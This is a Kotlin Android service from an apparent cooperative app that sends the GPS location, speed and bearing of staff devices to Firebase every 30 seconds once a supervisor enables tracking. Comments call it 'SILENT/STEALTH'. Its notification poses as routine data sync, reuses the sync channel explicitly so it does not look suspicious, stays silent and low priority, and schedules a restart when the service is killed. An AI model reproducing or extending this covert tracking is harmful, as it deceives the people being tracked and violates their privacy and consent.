package com.example.koperasikitagodangulu.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.koperasikitagodangulu.MainActivity
import com.example.koperasikitagodangulu.R
import com.google.android.gms.location.*
import com.google.firebase.auth.ktx.auth
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.example.koperasikitagodangulu.services.LocationCheckWorker

/**
 * =========================================================================
 * LOCATION TRACKING SERVICE (SILENT/STEALTH)
 * =========================================================================
 *
 * Service ini berjalan di device Admin/Pimpinan/Koordinator.
 * Diaktifkan ketika Pengawas menyalakan tracking dari app-nya.
 *
 * PENTING:
 * - Notifikasi ditampilkan sebagai "Sinkronisasi data..." agar stealth
 * - Menggunakan FusedLocationProviderClient (paling akurat)
 * - Update setiap 30 detik
 * - Overwrite 1 node di Firebase (hemat biaya)
 * - Otomatis stop ketika pengawas matikan tracking
 * =========================================================================
 */
class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationTrackingService"
        private const val CHANNEL_ID = "sync_channel"  // ← SAMA dengan SyncForegroundService agar stealth
        private const val NOTIFICATION_ID = 1002
        private const val UPDATE_INTERVAL_MS = 30_000L  // 30 detik
        private const val FASTEST_INTERVAL_MS = 15_000L // Minimum 15 detik

        fun start(context: Context) {
            try {
                val intent = Intent(context, LocationTrackingService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                Log.d(TAG, "🔍 Location tracking service started")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error starting location service: ${e.message}")
            }
        }

        fun stop(context: Context) {
            try {
                val intent = Intent(context, LocationTrackingService::class.java)
                context.stopService(intent)
                Log.d(TAG, "🛑 Location tracking service stopped")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error stopping location service: ${e.message}")
            }
        }
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var locationCallback: LocationCallback? = null
    private val database = Firebase.database(
        "https://koperasikitagodangulu-default-rtdb.asia-southeast1.firebasedatabase.app"
    ).reference

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createStealthNotification()
        startForeground(NOTIFICATION_ID, notification)

        val uid = Firebase.auth.currentUser?.uid
        if (uid == null) {
            Log.e(TAG, "❌ User not authenticated, stopping service")
            stopSelf()
            return START_NOT_STICKY
        }

        // Verifikasi apakah tracking masih aktif sebelum mulai
        database.child("location_tracking").child(uid).child("active")
            .get().addOnSuccessListener { snapshot ->
                val isActive = snapshot.getValue(Boolean::class.java) ?: false
                if (isActive) {
                    Log.d(TAG, "✅ Tracking verified ACTIVE → starting location updates")
                    startLocationUpdates()
                } else {
                    Log.d(TAG, "🛑 Tracking flag FALSE → stopping service")
                    stopSelf()
                }
            }.addOnFailureListener { e ->
                // Offline → tetap jalankan sebagai safety fallback
                Log.w(TAG, "⚠️ Cannot verify flag (offline?), starting anyway: ${e.message}")
                startLocationUpdates()
            }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()

        // ✅ PERBAIKAN: JANGAN hapus data lokasi.
        // Android bisa kill service kapan saja (Doze, battery optimization).
        // Data lokasi terakhir harus tetap tampil di layar Pengawas.
        // Data hanya dihapus oleh Pengawas via deactivateTracking().

        val uid = Firebase.auth.currentUser?.uid
        if (uid != null) {
            try {
                LocationCheckWorker.scheduleImmediate(applicationContext)
                Log.d(TAG, "⚠️ Service destroyed, scheduled restart check")
            } catch (e: Exception) {
                Log.e(TAG, "Error scheduling restart: ${e.message}")
            }
        }

        Log.d(TAG, "🛑 Service destroyed (location data PRESERVED)")
    }

    private fun startLocationUpdates() {
        // Cek permission
        if (ContextCompat.checkSelfPermission(this,
                android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ Location permission not granted")
            stopSelf()
            return
        }

        val uid = Firebase.auth.currentUser?.uid
        if (uid == null) {
            Log.e(TAG, "❌ User not authenticated")
            stopSelf()
            return
        }

        // ✅ LANGKAH 1: Kirim lokasi terakhir dari cache SEGERA (tanpa tunggu GPS fix)
        try {
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                if (location != null) {
                    val locationData = mapOf(
                        "latitude" to location.latitude,
                        "longitude" to location.longitude,
                        "accuracy" to location.accuracy.toDouble(),
                        "speed" to location.speed.toDouble(),
                        "bearing" to location.bearing.toDouble(),
                        "provider" to (location.provider ?: "cached"),
                        "timestamp" to location.time,
                        "lastUpdated" to System.currentTimeMillis()
                    )
                    database.child("user_locations").child(uid).setValue(locationData)
                    Log.d(TAG, "📍 Immediate cached location sent: ${location.latitude}, ${location.longitude}")
                } else {
                    Log.d(TAG, "⚠️ No cached location available, waiting for GPS fix...")
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "❌ Security exception getting last location: ${e.message}")
        }

        // ✅ LANGKAH 2: Start location updates berkelanjutan
        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            UPDATE_INTERVAL_MS
        ).apply {
            setMinUpdateIntervalMillis(FASTEST_INTERVAL_MS)
            // DIHAPUS: setWaitForAccurateLocation(true) → agar lokasi dikirim secepat mungkin
        }.build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val location = result.lastLocation ?: return

                // Overwrite single node (HEMAT BIAYA!)
                val locationData = mapOf(
                    "latitude" to location.latitude,
                    "longitude" to location.longitude,
                    "accuracy" to location.accuracy.toDouble(),
                    "speed" to location.speed.toDouble(),
                    "bearing" to location.bearing.toDouble(),
                    "provider" to (location.provider ?: "fused"),
                    "timestamp" to location.time,
                    "lastUpdated" to System.currentTimeMillis()
                )

                database.child("user_locations").child(uid)
                    .setValue(locationData)
                    .addOnSuccessListener {
                        Log.d(TAG, "📍 Location updated: ${location.latitude}, ${location.longitude}")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "❌ Failed to update location: ${e.message}")
                    }
            }
        }

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback!!,
            Looper.getMainLooper()
        ).addOnFailureListener { e ->
            Log.e(TAG, "❌ requestLocationUpdates FAILED: ${e.message}")
        }

        Log.d(TAG, "📍 Location updates started (interval: ${UPDATE_INTERVAL_MS/1000}s)")
    }

    private fun stopLocationUpdates() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            locationCallback = null
        }
    }

    /**
     * Notifikasi STEALTH - terlihat seperti sinkronisasi data biasa
     */
    private fun createStealthNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Sinkronisasi Data")
            .setContentText("Sinkronisasi data berjalan...")
            .setSmallIcon(R.drawable.ic_launcher_foreground) // Gunakan icon yang sudah ada
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)  // TIDAK ada suara
            .setPriority(NotificationCompat.PRIORITY_LOW) // Prioritas rendah agar tidak mencolok
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Pakai channel yang SAMA dengan sync service agar tidak mencurigakan
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sinkronisasi",
                NotificationManager.IMPORTANCE_LOW  // Tidak ada suara/getaran
            ).apply {
                description = "Sinkronisasi data"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
}